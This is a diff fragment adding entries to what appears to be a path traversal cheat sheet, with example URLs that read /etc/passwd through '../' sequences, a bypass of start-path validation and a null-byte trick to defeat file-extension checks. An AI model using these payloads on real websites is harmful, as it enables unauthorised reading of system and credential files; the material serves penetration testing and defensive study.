@@ -49,3 +49,12 @@ You can use nested cross strings like ....// or ....\/. These revert to simple c
 http://example.com/index.php?page=images….//….//….//...etc/passwd
 
 
+Validation of Start Path
+-------------------------
+http://example.com/index.php?page=/validated_path/../../../../../../../etc/passwd
+
+
+Null Byte Bypass
+-----------------
+http://example.com/index.php?page=/../../../../../../../etc/passwd%00 >> this escape ".png, .jpg..." extensions
+
